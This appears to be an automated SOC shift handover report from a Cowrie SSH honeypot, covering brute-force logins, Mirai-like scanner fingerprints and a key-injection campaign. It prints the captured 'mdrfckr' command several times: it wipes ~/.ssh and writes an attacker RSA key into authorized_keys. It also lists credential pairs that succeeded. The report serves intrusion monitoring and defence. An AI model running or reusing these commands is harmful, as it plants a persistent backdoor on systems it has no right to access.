# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-20 |
| **Generated At** | 2026-06-20T21:22:29Z |
| **Shift Time** | 21:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **87** |
| Confirmed Threats | **86** |
| False Positives Filtered | **1** (1.1%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **11** |
| High Severity Cases | **17** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **70** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **52** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **27** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 17 |
| `345gs5662d34` | 8 |
| `jira` | 2 |
| `user1` | 2 |
| `media` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `jirajira` | 2 |
| `user@123` | 2 |
| `123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 8 |
| `jira` | `jirajira` | 2 |
| `user1` | `user@123` | 2 |
| `media` | `media` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `44` | `49.124.153.12` | 2026-06-20T20:16:05 |
| `root` | `Abcd1234$` | `103.176.79.137` | 2026-06-20T20:47:32 |
| `root` | `3245gs5662d34` | `103.176.79.137` | 2026-06-20T20:47:37 |
| `root` | `Password0` | `103.176.79.137` | 2026-06-20T20:48:43 |
| `root` | `1@Qwertyuiop` | `103.176.79.137` | 2026-06-20T20:49:15 |
| `root` | `0000000000` | `103.176.79.137` | 2026-06-20T20:51:53 |
| `root` | `123456Dd` | `103.176.79.137` | 2026-06-20T20:54:35 |
| `root` | `Pr@ject94` | `103.176.79.137` | 2026-06-20T20:56:15 |
| `root` | `pass123!` | `103.176.79.137` | 2026-06-20T20:57:08 |
| `root` | `Ebznl150783` | `103.176.79.137` | 2026-06-20T20:57:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **87** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 48 |
| OpenSSH | 4 |
| Unknown | 2 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 48 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 4 | 4 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 48 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 4 | 4 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 1 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.176.79.137`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **16** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS14987` | Rethem Hosting LLC | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS4771` | Spark New Zealand Trading Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (17)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e779fd7a0b3c

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]12` |
| **First Seen** | 2026-06-20 20:16 |
| **Last Seen** | 2026-06-20 20:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:16:03` | `cowrie.session.connect` |
| `2026-06-20 20:16:03` | `cowrie.client.version` |
| `2026-06-20 20:16:03` | `cowrie.client.kex` |
| `2026-06-20 20:16:05` | `cowrie.login.success` |
| `2026-06-20 20:16:05` | `cowrie.direct-tcpip.request` |
| `2026-06-20 20:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]12` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bf5e6e1f817

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:47 |
| **Last Seen** | 2026-06-20 20:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:47:31` | `cowrie.session.connect` |
| `2026-06-20 20:47:31` | `cowrie.client.version` |
| `2026-06-20 20:47:31` | `cowrie.client.kex` |
| `2026-06-20 20:47:32` | `cowrie.login.success` |
| `2026-06-20 20:47:32` | `cowrie.session.params` |
| `2026-06-20 20:47:32` | `cowrie.command.input` |
| `2026-06-20 20:47:32` | `cowrie.command.failed` |
| `2026-06-20 20:47:33` | `cowrie.log.closed` |
| `2026-06-20 20:47:33` | `cowrie.session.params` |
| `2026-06-20 20:47:33` | `cowrie.command.input` |
| `2026-06-20 20:47:33` | `cowrie.session.file_download` |
| `2026-06-20 20:47:33` | `cowrie.log.closed` |
| `2026-06-20 20:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-765078691ed4

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:47 |
| **Last Seen** | 2026-06-20 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:47:36` | `cowrie.session.connect` |
| `2026-06-20 20:47:36` | `cowrie.client.version` |
| `2026-06-20 20:47:36` | `cowrie.client.kex` |
| `2026-06-20 20:47:37` | `cowrie.login.success` |
| `2026-06-20 20:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f03a96f237d

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:48 |
| **Last Seen** | 2026-06-20 20:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:48:42` | `cowrie.session.connect` |
| `2026-06-20 20:48:42` | `cowrie.client.version` |
| `2026-06-20 20:48:42` | `cowrie.client.kex` |
| `2026-06-20 20:48:43` | `cowrie.login.success` |
| `2026-06-20 20:48:44` | `cowrie.session.params` |
| `2026-06-20 20:48:44` | `cowrie.command.input` |
| `2026-06-20 20:48:44` | `cowrie.command.failed` |
| `2026-06-20 20:48:44` | `cowrie.log.closed` |
| `2026-06-20 20:48:44` | `cowrie.session.params` |
| `2026-06-20 20:48:44` | `cowrie.command.input` |
| `2026-06-20 20:48:44` | `cowrie.session.file_download` |
| `2026-06-20 20:48:44` | `cowrie.log.closed` |
| `2026-06-20 20:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894cd1c61436

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:48 |
| **Last Seen** | 2026-06-20 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:48:47` | `cowrie.session.connect` |
| `2026-06-20 20:48:47` | `cowrie.client.version` |
| `2026-06-20 20:48:47` | `cowrie.client.kex` |
| `2026-06-20 20:48:48` | `cowrie.login.success` |
| `2026-06-20 20:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-404c587830e1

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:49 |
| **Last Seen** | 2026-06-20 20:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:49:14` | `cowrie.session.connect` |
| `2026-06-20 20:49:14` | `cowrie.client.version` |
| `2026-06-20 20:49:14` | `cowrie.client.kex` |
| `2026-06-20 20:49:15` | `cowrie.login.success` |
| `2026-06-20 20:49:15` | `cowrie.session.params` |
| `2026-06-20 20:49:15` | `cowrie.command.input` |
| `2026-06-20 20:49:15` | `cowrie.command.failed` |
| `2026-06-20 20:49:15` | `cowrie.log.closed` |
| `2026-06-20 20:49:16` | `cowrie.session.params` |
| `2026-06-20 20:49:16` | `cowrie.command.input` |
| `2026-06-20 20:49:16` | `cowrie.session.file_download` |
| `2026-06-20 20:49:16` | `cowrie.log.closed` |
| `2026-06-20 20:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d9a6244a166

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:49 |
| **Last Seen** | 2026-06-20 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:49:18` | `cowrie.session.connect` |
| `2026-06-20 20:49:18` | `cowrie.client.version` |
| `2026-06-20 20:49:19` | `cowrie.client.kex` |
| `2026-06-20 20:49:19` | `cowrie.login.success` |
| `2026-06-20 20:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-537c68e71deb

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:51 |
| **Last Seen** | 2026-06-20 20:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:51:52` | `cowrie.session.connect` |
| `2026-06-20 20:51:52` | `cowrie.client.version` |
| `2026-06-20 20:51:53` | `cowrie.client.kex` |
| `2026-06-20 20:51:53` | `cowrie.login.success` |
| `2026-06-20 20:51:54` | `cowrie.session.params` |
| `2026-06-20 20:51:54` | `cowrie.command.input` |
| `2026-06-20 20:51:54` | `cowrie.command.failed` |
| `2026-06-20 20:51:54` | `cowrie.log.closed` |
| `2026-06-20 20:51:54` | `cowrie.session.params` |
| `2026-06-20 20:51:54` | `cowrie.command.input` |
| `2026-06-20 20:51:55` | `cowrie.session.file_download` |
| `2026-06-20 20:51:55` | `cowrie.log.closed` |
| `2026-06-20 20:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33bcb687363c

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:51 |
| **Last Seen** | 2026-06-20 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:51:57` | `cowrie.session.connect` |
| `2026-06-20 20:51:57` | `cowrie.client.version` |
| `2026-06-20 20:51:57` | `cowrie.client.kex` |
| `2026-06-20 20:51:58` | `cowrie.login.success` |
| `2026-06-20 20:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e5e81242b7c

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:54 |
| **Last Seen** | 2026-06-20 20:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:54:34` | `cowrie.session.connect` |
| `2026-06-20 20:54:34` | `cowrie.client.version` |
| `2026-06-20 20:54:34` | `cowrie.client.kex` |
| `2026-06-20 20:54:35` | `cowrie.login.success` |
| `2026-06-20 20:54:35` | `cowrie.session.params` |
| `2026-06-20 20:54:35` | `cowrie.command.input` |
| `2026-06-20 20:54:35` | `cowrie.command.failed` |
| `2026-06-20 20:54:36` | `cowrie.log.closed` |
| `2026-06-20 20:54:36` | `cowrie.session.params` |
| `2026-06-20 20:54:36` | `cowrie.command.input` |
| `2026-06-20 20:54:36` | `cowrie.session.file_download` |
| `2026-06-20 20:54:36` | `cowrie.log.closed` |
| `2026-06-20 20:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd7a9369f2e

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:54 |
| **Last Seen** | 2026-06-20 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:54:39` | `cowrie.session.connect` |
| `2026-06-20 20:54:39` | `cowrie.client.version` |
| `2026-06-20 20:54:39` | `cowrie.client.kex` |
| `2026-06-20 20:54:40` | `cowrie.login.success` |
| `2026-06-20 20:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f956a8eae8d

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:56 |
| **Last Seen** | 2026-06-20 20:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:56:14` | `cowrie.session.connect` |
| `2026-06-20 20:56:14` | `cowrie.client.version` |
| `2026-06-20 20:56:15` | `cowrie.client.kex` |
| `2026-06-20 20:56:15` | `cowrie.login.success` |
| `2026-06-20 20:56:16` | `cowrie.session.params` |
| `2026-06-20 20:56:16` | `cowrie.command.input` |
| `2026-06-20 20:56:16` | `cowrie.command.failed` |
| `2026-06-20 20:56:16` | `cowrie.log.closed` |
| `2026-06-20 20:56:17` | `cowrie.session.params` |
| `2026-06-20 20:56:17` | `cowrie.command.input` |
| `2026-06-20 20:56:17` | `cowrie.session.file_download` |
| `2026-06-20 20:56:17` | `cowrie.log.closed` |
| `2026-06-20 20:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e613045648e

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:56 |
| **Last Seen** | 2026-06-20 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-20 20:56:19` | `cowrie.session.connect` |
| `2026-06-20 20:56:19` | `cowrie.client.version` |
| `2026-06-20 20:56:19` | `cowrie.client.kex` |
| `2026-06-20 20:56:20` | `cowrie.login.success` |
| `2026-06-20 20:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.79[.]137` to AbuseIPDB if not already reported
- [ ] Block `103.176.79[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f3a9d7527f

| Field | Detail |
|---|---|
| **Source IP** | `103.176.79[.]137` |
| **First Seen** | 2026-06-20 20:57 |
| **Last Seen** | 2026-06-20 20:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

